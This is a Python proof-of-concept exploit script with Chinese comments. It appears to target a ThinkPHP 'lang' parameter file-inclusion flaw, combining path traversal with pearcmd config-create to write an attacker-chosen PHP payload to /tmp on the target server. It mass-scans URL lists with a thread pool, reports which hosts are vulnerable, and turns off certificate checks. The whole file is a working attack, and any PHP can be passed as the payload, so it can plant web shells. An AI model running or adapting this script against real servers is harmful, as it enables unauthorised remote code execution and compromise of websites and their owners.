from optparse import OptionParser
import multiprocessing.pool
from colorama import init
import urllib.request
import urllib.parse
import ssl
import re



init()


# 禁用 SSL 证书验证
ssl._create_default_https_context = ssl._create_unverified_context



headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
}



def poc(url,payload="<?=phpinfo()?>",file="test.php"):

    row_url = f"{url.strip()}/"
    reg_url = re.compile("(https|http)://(.*?)\/")
    part_url = reg_url.findall(row_url)
    domain = f"{part_url[0][0]}://{part_url[0][1]}"

    path = "../../../../../../../../../../../../.."
    n = 0
    for i in range(1,5):
        add = "/.." * i
        path = path + add

        lang = f"lang={path}/usr/local/lib/php/pearcmd&+config-create+/&/{payload}+/tmp/{file}"
        url_lang = f"{domain}/public/index.php?{lang}"

        get_file_url = f"{domain}/public/index.php?lang={path[:-6]}/tmp/{file[:-4]}"

        try:
            req = urllib.request.Request(url=url_lang, headers=headers, method='GET')
            response = urllib.request.urlopen(req,timeout=8)

            if "Successfully created" in response.read().decode('utf-8'):
                print(f"\033[31m[+] {url_lang}文件/tmp/{file}上传成功，存在漏洞\033[0m")
                print(f"\033[31m[+] 文件访问路径{get_file_url}\033[0m")
                return True
        except:
            n += 1
            if n == 4:
                print(f"[-] {url}网络连接错误")
    print(f"[*] {url}无漏洞")





def main():
    parser = OptionParser()


    parser.add_option("-u",default="",dest="url",help='验证漏洞的目标url')
    parser.add_option("-f",default="",dest="file",help="批量导入url文件")
    parser.add_option("-p",default="<?=phpinfo()?>",dest="payload",help="上传payload，默认是<?phpinfo()?>")
    parser.add_option("-t",default=5,dest="thread",help="启动线程数")

    options, args = parser.parse_args()

    url=options.url
    file=options.file
    payload=options.payload
    thread=options.thread

    if url != "":
        poc(url=url,payload=payload)

    elif file != "":
        url_list = []
        with open(file,"rt",encoding="utf-8") as f:
            for line in f:
                url_list.append(line.strip())
        
        arg_list = []
        for url in url_list:
            arg = [url,payload,"test.php"]
            arg_list.append(tuple(arg))


        # 创建线程池
        num_threads = int(thread)
        with multiprocessing.pool.ThreadPool(num_threads) as pool:
            # 向线程池中提交任务
            pool.starmap(poc, arg_list)



if __name__ == '__main__':
    main()